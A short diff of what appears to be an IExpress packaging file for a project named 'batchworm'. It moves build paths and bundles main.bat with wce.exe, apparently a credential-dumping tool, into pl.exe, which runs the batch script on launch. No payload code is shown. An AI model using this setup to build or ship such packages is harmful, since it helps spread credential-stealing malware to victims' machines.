@@ -24,7 +24,7 @@ SourceFiles=SourceFiles
 InstallPrompt=
 DisplayLicense=
 FinishMessage=
-TargetName=C:\Users\donovan\Desktop\batchworm\source\pl.exe
+TargetName=C:\batchworm\source\pl.exe
 FriendlyName= 
 AppLaunched=cmd /c main.bat
 PostInstallCmd=<None>
@@ -33,7 +33,7 @@ UserQuietInstCmd=
 FILE0="main.bat"
 FILE1="wce.exe"
 [SourceFiles]
-SourceFiles0=C:\Users\donovan\Desktop\batchworm\source\
+SourceFiles0=C:\batchworm\source\
 [SourceFiles0]
 %FILE0%=
 %FILE1%=
